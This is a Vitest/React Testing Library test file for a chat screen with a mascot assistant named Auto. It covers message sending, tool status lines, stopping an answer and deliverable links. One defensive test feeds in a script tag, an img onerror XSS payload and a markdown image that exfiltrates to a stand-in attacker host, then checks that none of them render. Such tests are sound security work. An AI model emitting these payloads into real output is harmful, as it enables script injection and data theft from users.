import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { ChatScreen } from "@/components/chat/ChatScreen";
import { createApiClient } from "@/lib/client/api";
import { HELLO_KEY } from "@/lib/mascot/session";

import { callsTo, type ChatAnswer, fixtureAnswer, hangingAnswer, mockChatFetch, type StreamAnswer } from "./helpers";

// The chat screen end to end: typed input, the mocked fetch behind createApiClient,
// the real parser, the real hook. The mascot files are never there (placeholder).

const CHAT = `d:{"type":"chat-id","chatId":"chat-9"}`;
const DELIVERABLE_ID = "9b2f4c1e-7a3d-4e5f-8a90-1b2c3d4e5f60";

/** Stream lines that end with the body (no hang). */
function linesAnswer(lines: readonly string[]): StreamAnswer {
  return { ...hangingAnswer(lines), hang: false };
}

function renderChat(answers: readonly ChatAnswer[]) {
  const fetchMock = mockChatFetch(answers);
  const user = userEvent.setup();
  const view = render(<ChatScreen client={createApiClient(fetchMock)} />);
  return { ...view, fetchMock, user, box: screen.getByRole("textbox", { name: "Message Auto" }) };
}

function conversation() {
  return within(screen.getByRole("list", { name: "Conversation" }));
}

async function waitForTurnEnd() {
  await screen.findByRole("button", { name: "Send" });
}

// hello is a one-shot that holds Auto for a clip: these tests start after it (tests/edges has it).
beforeEach(() => {
  window.sessionStorage.setItem(HELLO_KEY, "1");
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

describe("ChatScreen", () => {
  it("starts as a new chat: Auto big in the middle, then in the mascot column once you send", async () => {
    const { user, box } = renderChat([fixtureAnswer("plain-answer")]);
    expect(screen.getByRole("heading", { level: 1, name: "New chat" })).toBeInTheDocument();
    expect(screen.getByRole("region", { name: "Say hello" })).toBeInTheDocument();
    expect(screen.queryByRole("complementary", { name: "Auto" })).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Send" })).toBeDisabled();
    await user.type(box, "hello{Enter}");
    expect(screen.queryByRole("region", { name: "Say hello" })).not.toBeInTheDocument();
    expect(await screen.findByText(/What shall we make today\?/)).toBeInTheDocument();
    await waitForTurnEnd();
    expect(screen.getByRole("complementary", { name: "Auto" })).toHaveTextContent("Ready when you are");
  });

  it("sending shows the user bubble and Auto's answer", async () => {
    const { user, box } = renderChat([fixtureAnswer("plain-answer")]);
    await user.type(box, "hello");
    await user.click(screen.getByRole("button", { name: "Send" }));
    expect(conversation().getByText("hello")).toBeInTheDocument();
    expect(box).toHaveValue("");
    expect(await conversation().findByText(/What shall we make today\?/)).toBeInTheDocument();
    expect(conversation().getByRole("heading", { name: "Auto" })).toBeInTheDocument();
    await waitForTurnEnd();
  });

  it("Enter sends; Shift+Enter adds a line instead", async () => {
    const { user, box, fetchMock } = renderChat([fixtureAnswer("plain-answer")]);
    await user.type(box, "first line{Shift>}{Enter}{/Shift}second line");
    expect(box).toHaveValue("first line\nsecond line");
    expect(callsTo(fetchMock, "/api/chat")).toHaveLength(0);
    await user.type(box, "{Enter}");
    await waitFor(() => expect(callsTo(fetchMock, "/api/chat")).toHaveLength(1));
    expect(conversation().getByText(/first line\s+second line/)).toBeInTheDocument();
    await waitForTurnEnd();
  });

  it("a fixture stream shows the tool line and the receipts", async () => {
    const { user, box } = renderChat([fixtureAnswer("web-search")]);
    await user.type(box, "find me an e-bike{Enter}");
    const receipts = await screen.findByRole("region", { name: "What Auto did" });
    expect(within(receipts).getByText("Searched the web: electric bikes 2026")).toBeInTheDocument();
    const tools = screen.getByRole("list", { name: "Tools Auto used" });
    expect(within(tools).getByText("Searched the web · 3 results · 2.1 s")).toBeInTheDocument();
    expect(conversation().getByText("Volt One").tagName).toBe("STRONG");
    await waitForTurnEnd();
  });

  it("shows the running tool line, and Stop instead of Send while Auto answers", async () => {
    const running = `d:{"type": "tool-start", "data": {"toolCallId": "c1", "toolName": "platform_web_search", "input": {"query": "best budget laptops"}}}`;
    const { user, box, fetchMock } = renderChat([hangingAnswer([CHAT, running])]);
    await user.type(box, "laptops?{Enter}");
    expect(await screen.findByText("Searching the web: 'best budget laptops'")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Stop" })).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Send" })).not.toBeInTheDocument();
    expect(screen.getByRole("complementary", { name: "Auto" })).toHaveTextContent("best budget laptops");

    await user.click(screen.getByRole("button", { name: "Stop" }));
    await waitForTurnEnd();
    await waitFor(() => expect(callsTo(fetchMock, "/api/chat/chat-9/cancel")).toHaveLength(1));
    expect(screen.getByText("Stopped: searching the web")).toBeInTheDocument();
  });

  it("never renders a <script> (or any HTML, or an image) from the model", async () => {
    const { user, box, container } = renderChat([
      // A JSON "\n" on the wire: the script is its own HTML block, the next paragraph has inline HTML.
      linesAnswer([
        CHAT,
        `0:"<script>window.pwned = true</script>\\n\\nHello <img src=x onerror=alert(1)> **there** ![a chart](https://attacker.test/p.png?d=secret)"`,
        `d:{"type":"finish","finishReason":"stop"}`,
      ]),
    ]);
    await user.type(box, "hi{Enter}");
    expect(await screen.findByText("there")).toBeInTheDocument();
    await waitForTurnEnd();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("[onerror]")).toBeNull();
    // A markdown image is its alt text: nothing is fetched from the model's URL.
    expect(container.querySelector('img[src^="https://attacker.test"]')).toBeNull();
    expect(conversation().getByText("a chart")).toBeInTheDocument();
    expect(container.innerHTML).not.toContain("<script");
    expect(Reflect.get(window, "pwned")).toBeUndefined();
  });

  it("a made document shows a Deliverable card with an Open link", async () => {
    const made = `d:{"type":"tool-data","data":{"generated_document": {"filename": "laptop-shortlist.pdf", "format": "pdf", "title": "Laptop shortlist", "deliverable_id": "${DELIVERABLE_ID}"}}}`;
    const { user, box } = renderChat([linesAnswer([CHAT, made, `0:"Done!"`, `d:{"type":"finish","finishReason":"stop"}`])]);
    await user.type(box, "make me a shortlist{Enter}");
    const open = await screen.findByRole("link", { name: "Open Laptop shortlist" });
    expect(open).toHaveAttribute("href", `/deliverables/${DELIVERABLE_ID}`);
    expect(screen.getByRole("article", { name: "Deliverable: Laptop shortlist" })).toHaveTextContent("Document");
    await waitForTurnEnd();
  });

  it("puts Auto in a small row above the message box where the mascot column is hidden", async () => {
    vi.stubGlobal(
      "matchMedia",
      vi.fn((query: string) => ({
        matches: query.includes("max-width"),
        media: query,
        addEventListener: vi.fn(),
        removeEventListener: vi.fn(),
      })),
    );
    const { container, user, box } = renderChat([fixtureAnswer("plain-answer")]);
    // The empty chat has Auto big in the middle instead.
    expect(container.querySelector('[data-size="large"]')).not.toBeNull();
    await user.type(box, "hello{Enter}");
    await waitForTurnEnd();
    const autos = screen.getAllByRole("complementary", { name: "Auto" });
    expect(autos).toHaveLength(1);
    expect(container.querySelector('[data-size="small"]')).not.toBeNull();
    expect(container.querySelector('[data-size="regular"]')).toBeNull();
  });
});
